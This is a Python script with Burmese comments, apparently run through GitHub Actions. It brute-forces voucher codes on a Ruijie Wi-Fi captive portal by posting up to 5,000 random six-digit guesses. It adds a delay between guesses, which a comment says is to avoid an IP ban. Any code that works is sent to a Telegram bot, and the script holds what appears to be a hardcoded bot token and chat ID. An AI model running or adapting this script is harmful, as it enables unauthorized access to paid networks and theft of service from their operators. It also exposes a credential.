import time
import random
import requests
import os

# သင်၏ Telegram Bot အချက်အလက်များ
TELEGRAM_BOT_TOKEN = "9137803689:AAGYQD_F7IfK2Q6KKptNU3UWW7DpCA65RL4"
CHAT_ID = "6130147402" 

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def run_scanner():
    print("🚀 GitHub Actions: Ruijie Safe & Fast Voucher Scanner Started")
    send_telegram_msg("🚀 <b>GitHub Actions Bot:</b> စကန်ဖတ်ခြင်း စတင်ပါပြီ။")
    
    # ⚠️ အောက်ပါ 'http://YOUR_PORTAL_URL_HERE/portal' နေရာတွင် သင်စကန်ဖတ်မည့် Ruijie Portal URL အမှန်ကို ထည့်ပါ
    portal_url = "http://YOUR_PORTAL_URL_HERE/portal"  
    prefix = "2"    # စတင်မည့် အစဂဏန်း
    length = 6      # ကုဒ်အရှည်
    pool = "0123456789"

    total_checked = 0

    while total_checked < 5000:
        test_code = prefix + "".join(random.choices(pool, k=length - len(prefix)))
        total_checked += 1

        try:
            response = requests.post(
                portal_url,
                data={f"voucher": test_code, "login": "submit"},
                timeout=4
            )
            
            resp_text = response.text
            if "Invalid" not in resp_text and "Error" not in resp_text and response.status_code == 200:
                success_msg = f"🎉 <b>အောင်မြင်ပါသည်! တွေ့ရှိသော ကုဒ်မှာ:</b>\n🔑 <code>{test_code}</code>\n📊 စုစုပေါင်း စစ်ဆေးမှု: {total_checked} ခု"
                print(success_msg)
                send_telegram_msg(success_msg)
                break
        except requests.exceptions.RequestException:
            time.sleep(0.5)
            continue

        # IP Ban မခံရအောင် Delay ခဏပေးခြင်း (0.15 စက္ကန့်)
        time.sleep(0.15)

        if total_checked % 50 == 0:
            print(f"📊 စစ်ဆေးပြီး: {total_checked} ခု | လက်ရှိစမ်းနေသည်: {test_code}")

if __name__ == "__main__":
    run_scanner()
    
